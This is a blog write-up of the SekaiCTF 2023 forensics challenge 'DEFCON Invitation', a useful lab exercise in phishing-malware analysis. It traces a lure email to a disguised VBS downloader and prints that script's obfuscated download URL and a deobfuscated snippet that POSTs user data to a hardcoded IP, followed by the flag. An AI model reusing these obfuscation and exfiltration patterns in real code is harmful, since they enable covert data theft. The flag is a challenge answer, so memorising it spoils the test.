---
layout: post
title:  "SekaiCTF 2023 - DEFCON Invitation"
date:   2023-08-28 06:21:40 +0530
categories: Forensics
tags: ["Forensics"]
---

```Description:-```
As you all know, DEF CON CTF Qualifier 2023 was really competitive and we didn't make it. Surprisingly, 2 months before the finals in Las Vegas, we received an official invitation from Nautilus Institute to attend the event. Should we accept the invitation and schedule the trip?

```Challenge File:``` [file](/assets/DEFCON_Finals_Invitation.eml)

In this challenge, a .eml file is provided which is commonly used for storing email messages. On opening this email, there was an [attachment](/assets/dc31-invite.ics) (calendar invitation). It is a .ics file which is for iCalendar files. In this, I got two links :- `https://nautilus.org/` and `https://storage.googleapis.com/defcon-nautilus/venue-guide.html`. So, I opened both links. In first one, I got nothing but in second, I got something - `Caesars Forum Venue Map` and there was a download option for map, I downloaded that but to my surprise it was vbs script and now this challenge has been reduced to a vbs script based challenge.


Now analysis part of vbs script starts...
In this, I found this.. and deobsfucating
{% highlight ruby %}

   ewkjunfw = Replace("68IlllIllIIIllllIllII74IlllIllIIIllllIllII74IlllIllIIIllllIllII70IlllIllIIIllllIllII73IlllIllIIIllllIllII3aIlllIllIIIllllIllII2fIlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII6fIlllIllIIIllllIllII77IlllIllIIIllllIllII6eIlllIllIIIllllIllII6cIlllIllIIIllllIllII6fIlllIllIIIllllIllII61IlllIllIIIllllIllII64IlllIllIIIllllIllII31IlllIllIIIllllIllII36IlllIllIIIllllIllII34IlllIllIIIllllIllII37IlllIllIIIllllIllII2eIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII66IlllIllIIIllllIllII69IlllIllIIIllllIllII72IlllIllIIIllllIllII65IlllIllIIIllllIllII2eIlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6dIlllIllIIIllllIllII2fIlllIllIIIllllIllII6cIlllIllIIIllllIllII31IlllIllIIIllllIllII38IlllIllIIIllllIllII38IlllIllIIIllllIllII75IlllIllIIIllllIllII32IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII71IlllIllIIIllllIllII67IlllIllIIIllllIllII33IlllIllIIIllllIllII66IlllIllIIIllllIllII4fIlllIllIIIllllIllII6fIlllIllIIIllllIllII4cIlllIllIIIllllIllII70IlllIllIIIllllIllII69IlllIllIIIllllIllII6cIlllIllIIIllllIllII63IlllIllIIIllllIllII49IlllIllIIIllllIllII38IlllIllIIIllllIllII39IlllIllIIIllllIllII70IlllIllIIIllllIllII30IlllIllIIIllllIllII5fIlllIllIIIllllIllII68IlllIllIIIllllIllII34IlllIllIIIllllIllII45IlllIllIIIllllIllII30IlllIllIIIllllIllII63IlllIllIIIllllIllII47IlllIllIIIllllIllII4cIlllIllIIIllllIllII6aIlllIllIIIllllIllII6bIlllIllIIIllllIllII5fIlllIllIIIllllIllII75IlllIllIIIllllIllII76IlllIllIIIllllIllII42IlllIllIIIllllIllII55IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII45IlllIllIIIllllIllII5fIlllIllIIIllllIllII72IlllIllIIIllllIllII4dIlllIllIIIllllIllII5aIlllIllIIIllllIllII2dIlllIllIIIllllIllII48IlllIllIIIllllIllII35IlllIllIIIllllIllII2dIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII39IlllIllIIIllllIllII4bIlllIllIIIllllIllII72IlllIllIIIllllIllII39IlllIllIIIllllIllII53IlllIllIIIllllIllII51IlllIllIIIllllIllII4cIlllIllIIIllllIllII56IlllIllIIIllllIllII51IlllIllIIIllllIllII61IlllIllIIIllllIllII4bIlllIllIIIllllIllII53IlllIllIIIllllIllII69IlllIllIIIllllIllII4bIlllIllIIIllllIllII63IlllIllIIIllllIllII45IlllIllIIIllllIllII76IlllIllIIIllllIllII4aIlllIllIIIllllIllII4fIlllIllIIIllllIllII2dIlllIllIIIllllIllII45IlllIllIIIllllIllII6bIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII53IlllIllIIIllllIllII55IlllIllIIIllllIllII71IlllIllIIIllllIllII57IlllIllIIIllllIllII6cIlllIllIIIllllIllII72IlllIllIIIllllIllII4eIlllIllIIIllllIllII36IlllIllIIIllllIllII53IlllIllIIIllllIllII7aIlllIllIIIllllIllII58IlllIllIIIllllIllII67IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII4cIlllIllIIIllllIllII59IlllIllIIIllllIllII42IlllIllIIIllllIllII68IlllIllIIIllllIllII2dIlllIllIIIllllIllII46IlllIllIIIllllIllII35IlllIllIIIllllIllII65IlllIllIIIllllIllII6dIlllIllIIIllllIllII34IlllIllIIIllllIllII49IlllIllIIIllllIllII41IlllIllIIIllllIllII34IlllIllIIIllllIllII69IlllIllIIIllllIllII58IlllIllIIIllllIllII33IlllIllIIIllllIllII74IlllIllIIIllllIllII4fIlllIllIIIllllIllII49IlllIllIIIllllIllII47IlllIllIIIllllIllII68IlllIllIIIllllIllII30IlllIllIIIllllIllII45IlllIllIIIllllIllII6aIlllIllIIIllllIllII34IlllIllIIIllllIllII36IlllIllIIIllllIllII47IlllIllIIIllllIllII6cIlllIllIIIllllIllII77IlllIllIIIllllIllII76IlllIllIIIllllIllII4cIlllIllIIIllllIllII4fIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII38IlllIllIIIllllIllII70IlllIllIIIllllIllII7aIlllIllIIIllllIllII76IlllIllIIIllllIllII75IlllIllIIIllllIllII79IlllIllIIIllllIllII39IlllIllIIIllllIllII31IlllIllIIIllllIllII55IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII6aIlllIllIIIllllIllII31IlllIllIIIllllIllII72IlllIllIIIllllIllII32IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII6aIlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII59IlllIllIIIllllIllII73IlllIllIIIllllIllII55IlllIllIIIllllIllII4eIlllIllIIIllllIllII63IlllIllIIIllllIllII73IlllIllIIIllllIllII73IlllIllIIIllllIllII50IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII30IlllIllIIIllllIllII38IlllIllIIIllllIllII64IlllIllIIIllllIllII73IlllIllIIIllllIllII6bIlllIllIIIllllIllII57IlllIllIIIllllIllII52IlllIllIIIllllIllII70IlllIllIIIllllIllII6bIlllIllIIIllllIllII41IlllIllIIIllllIllII49IlllIllIIIllllIllII2fIlllIllIIIllllIllII79IlllIllIIIllllIllII65IlllIllIIIllllIllII61IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII35IlllIllIIIllllIllII68IlllIllIIIllllIllII76IlllIllIIIllllIllII67IlllIllIIIllllIllII70IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII76IlllIllIIIllllIllII6dIlllIllIIIllllIllII76IlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII65IlllIllIIIllllIllII66IlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6eIlllIllIIIllllIllII2dIlllIllIIIllllIllII66IlllIllIIIllllIllII6cIlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII70IlllIllIIIllllIllII6eIlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII58IlllIllIIIllllIllII4fIlllIllIIIllllIllII52IlllIllIIIllllIllII65IlllIllIIIllllIllII64", "IlllIllIIIllllIllII", " ")

{% endhighlight %}

It results in `'https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7E_rMZ-H5-me9Kr9SQLVQaKSiKcEvJO-EkfTSUqWlrN6SzXgI0LYBh-F5em4IA4iX3tOIGh0Ej46GlwvLOfT8pzvuy91Utej1r2I0jg7YsUNcssPted508dskWRpkAI/yea535hvgp32vmv/defcon-flag.png.XORed'`
Yes, I was going right.. now I have flag.png xored and need key with which I can get my flag.
{% highlight ruby %}
  StRREVErsE(replace("=QWZ###############_###lWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcp###############_###Y", "###############_###", "z"))
{% endhighlight %}
It results in `c:\temp\defcon-flag.png.compromised`. 



Now search operation for key starts...


![Image](/assets/Exec.png)

So, we have to deobfuscate this vbs script. For this, I used `vbsedit` and it gave 

{% highlight ruby %}
 Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 Dim url: url = "http://20.106.250.46/sendUserData"

 With http
  Call .Open("POST", url, False)
  Call .SetRequestHeader("Content-Type", "application/json")
  Call .Send("{""username"":""" & strUser & """}")
 End With

 res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")
{% endhighlight %}

From above snippet, it seems that POST request is to be sent to the given URL, after setting request header `Content-Type` to `application/json` and sending json payload

{% highlight ruby %}
 {
   "username":"admin"
 }   
{% endhighlight %}

I set username to `admin` and bravo !! I got the key..

 ![Key](/assets/image.png)
 
So with the key we XORed the downloaded XORed flag.png and yesss.. we got the flag !!
 ![Flag](/assets/flag.png)
 
Flag :- `SEKAI{so_i_guess_we'll_get_more_better_next_year-_-}`

 
 





